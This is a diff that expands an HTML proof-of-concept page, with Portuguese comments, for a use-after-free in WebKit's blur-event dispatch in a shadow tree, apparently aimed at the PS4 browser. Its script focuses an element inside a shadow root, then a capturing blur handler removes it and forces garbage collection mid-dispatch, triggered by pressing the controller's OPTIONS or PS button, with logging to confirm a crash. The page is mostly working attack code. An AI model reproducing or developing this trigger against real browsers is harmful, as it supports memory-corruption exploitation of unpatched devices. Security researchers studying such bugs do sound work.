@@ -1,68 +1,146 @@
 <!DOCTYPE html>
 <html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  body  { font-family: monospace; background: #111; color: #0f0;
+          padding: 12px; font-size: 14px; }
+  h3    { color: #fff; margin: 0 0 8px; }
+  #instr{ border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; line-height: 1.8; }
+  #armBtn { background:#0f0; color:#000; font-size:16px; font-weight:bold;
+            padding:12px 28px; border:none; cursor:pointer; }
+  #armBtn:disabled { background:#444; color:#888; cursor:default; }
+  #result { font-size: 20px; font-weight: bold; margin: 12px 0;
+            min-height: 28px; color: #ff0; }
+  #log  { background:#000; border:1px solid #333; padding:8px;
+          height:220px; overflow-y:auto; font-size:12px; margin-top:8px; }
+  .ok   { color: #0f0; }
+  .warn { color: #ff0; }
+  .err  { color: #f44; }
+  .info { color: #4af; }
+</style>
+</head>
 <body>
-<p>UAF PoC — Element::dispatchBlurEvent / shadow tree</p>
-<div id="host"></div>
+<h3>UAF PoC — Element::dispatchBlurEvent (Shadow Tree)</h3>
+
+<div id="instr">
+  <b>PASSO 1:</b> Clique em <b>[Armar Teste]</b><br>
+  <b>PASSO 2:</b> Pressione o botão <b>OPTIONS</b> do controle para abrir o menu do navegador<br>
+  <b>PASSO 3:</b> Se não funcionar com OPTIONS, tente o botão <b>PS</b> (vai ao dashboard e volte)<br>
+  <span style="color:#aaa"><em>Crash = UAF confirmado. "PASS" exibido = processo sobreviveu.</em></span>
+</div>
+
+<button id="armBtn">Armar Teste</button>
+&nbsp;
+<span id="focusState" style="color:#888">—</span>
+
 <div id="result">Aguardando...</div>
+<div id="host-container"></div>
+<div id="log"></div>
+
 <script src="resources/gc.js"></script>
 <script>
 'use strict';
 
-let shadowRoot = host.attachShadow({ mode: 'open' });
-let victim = document.createElement('div');
-victim.tabIndex = 0;
-victim.textContent = 'Focusable';
-shadowRoot.appendChild(victim);
-victim.focus();  // foco ANTES de qualquer await
-
-async function runTest() {
-
-    // Captura o blur no document (fase capturing) ANTES do elemento receber o evento.
-    // É aqui que o UAF ocorre: remove + GC durante o dispatch de dispatchBlurEvent()
-    // enquanto o FocusController ainda segura um raw pointer sem RefPtr.
-    document.addEventListener('blur', () => {
-        if (!victim) return;  // guard contra double-fire
-        victim.remove();
-        victim = null;
-        gc();
-    }, true);
-
-    // Promise que resolve quando window recebe blur
-    // (window.blur é disparado por dispatchWindowEvent() logo APÓS dispatchBlurEvent())
-    const blurPromise = new Promise(resolve => {
-        window.addEventListener('blur', () => {
-            requestAnimationFrame(() => setTimeout(resolve, 0));
-        }, { once: true });
-    });
-
-    // ── TRIGGER ──────────────────────────────────────────────────────────────
-    // Objetivo: chamar dispatchEventsOnWindowAndFocusedElement(mainFrameDoc, false)
-    //
-    // Estratégia primária: mover o foco para um iframe
-    // → FocusController::setFocusedFrame(iframeFrame)
-    // → dispatchEventsOnWindowAndFocusedElement(mainDoc, false)  ← path bugado
-    const iframe = document.createElement('iframe');
-    iframe.src = 'about:blank';
-    iframe.style.cssText = 'position:fixed;width:1px;height:1px;top:-100px;left:-100px;';
-    document.body.appendChild(iframe);
-
-    try {
-        iframe.contentWindow.focus();
-    } catch (e) {}
-
-    // Estratégia fallback: window.blur()
-    // → DOMWindow::blur() → chrome().unfocusWindow() → WebPage::setWindowIsKey(false)
-    // Funciona se a implementação do PS4 suportar unfocusWindow
-    setTimeout(() => {
-        try { window.blur(); } catch (e) {}
-    }, 300);
-    // ─────────────────────────────────────────────────────────────────────────
-
-    await blurPromise;
-    result.textContent = 'PASS (sem crash)';
+// ── Utilitários de log ────────────────────────────────────────────────────────
+const logEl = document.getElementById('log');
+function log(msg, cls) {
+    const d = document.createElement('div');
+    d.className = cls || '';
+    d.textContent = (performance.now()|0) + 'ms  ' + msg;
+    logEl.appendChild(d);
+    logEl.scrollTop = logEl.scrollHeight;
 }
 
-runTest();
+// ── Listeners de diagnóstico global (não destrutivos) ─────────────────────────
+// Ficam sempre ativos para mostrar exatamente quais eventos chegam no PS4
+window.addEventListener('blur',
+    () => log('[window]   ← blur  (trigger recebido!)', 'warn'), true);
+window.addEventListener('focus',
+    () => log('[window]   → focus', 'info'), true);
+document.addEventListener('blur',
+    () => log('[document] blur — capturing', 'ok'), true);
+document.addEventListener('blur',
+    () => log('[document] blur — bubbling'));
+document.addEventListener('focus',
+    () => log('[document] focus — capturing', 'info'), true);
+
+// ── Estado ────────────────────────────────────────────────────────────────────
+let victim = null;
+
+// ── Armar ─────────────────────────────────────────────────────────────────────
+document.getElementById('armBtn').addEventListener('click', function () {
+    this.disabled = true;
+    log('=== ARMANDO TESTE ===', 'info');
+
+    // Limpar host anterior e criar novo (attachShadow só pode ser chamado uma vez)
+    const container = document.getElementById('host-container');
+    container.innerHTML = '';
+    const host = document.createElement('div');
+    host.id = 'host';
+    container.appendChild(host);
+
+    // Shadow root + victim focável dentro do shadow
+    const sr = host.attachShadow({ mode: 'open' });
+    victim = document.createElement('div');
+    victim.tabIndex = 0;
+    victim.textContent = '[victim — elemento alvo]';
+    victim.style.outline = '1px dashed #0f0';
+    sr.appendChild(victim);
+
+    // Focar o victim — document.activeElement será o host (shadow encapsula),
+    // mas document->focusedElement() em C++ retorna o victim real
+    victim.focus();
+
+    // Diagnóstico de foco
+    const ae = document.activeElement;
+    log('activeElement: ' + (ae ? ae.id || ae.tagName : 'null') +
+        '  (deve ser host)', ae?.id === 'host' ? 'ok' : 'warn');
+    log('sr.activeElement: ' + (sr.activeElement?.textContent ?? 'null'),
+        sr.activeElement === victim ? 'ok' : 'err');
+
+    // ── Listener CRÍTICO do UAF ────────────────────────────────────────────
+    // Fase capturing no document: intercepta o blur de victim DURANTE o dispatch
+    // de dispatchBlurEvent() em FocusController.cpp antes que o RefPtr proteja.
+    function uafHandler() {
+        if (!victim) return;           // guard contra re-entrada
+        log('>>> document.blur CAPTURE — removendo victim + gc()', 'warn');
+        victim.remove();
+        victim = null;
+        gc();                          // força GC: raw ptr sem RefPtr → UAF
+        log('>>> gc() concluído', 'warn');
+        document.removeEventListener('blur', uafHandler, true);
+    }
+    document.addEventListener('blur', uafHandler, true);
+
+    // ── Aguardar window.blur para exibir resultado ─────────────────────────
+    // window.blur é despachado por dispatchWindowEvent() logo APÓS
+    // dispatchBlurEvent() retornar. Se o processo não crashou até aqui, exibe PASS.
+    window.addEventListener('blur', function onWindowBlur() {
+        log('window.blur recebido — aguardando rAF + setTimeout...', 'warn');
+        requestAnimationFrame(() => {
+            setTimeout(() => {
+                document.getElementById('result').textContent =
+                    'PASS — processo sobreviveu (verifique log)';
+                log('PASS — sem crash nesta execução', 'ok');
+            }, 0);
+        });
+        window.removeEventListener('blur', onWindowBlur);
+    });
+
+    // ── Re-focar victim (clique no botão rouba o foco) ────────────────────
+    victim.focus();
+    const ae2 = document.activeElement;
+    document.getElementById('focusState').textContent =
+        'foco: ' + (ae2?.id || ae2?.tagName || '?');
+    log('Re-foco após clique no botão. activeElement: ' +
+        (ae2?.id || ae2?.tagName), ae2?.id === 'host' ? 'ok' : 'warn');
+
+    document.getElementById('result').textContent =
+        'ARMADO — pressione OPTIONS ou PS agora';
+    log('=== ARMADO — aguardando blur da window ===', 'info');
+});
 </script>
 </body>
 </html>
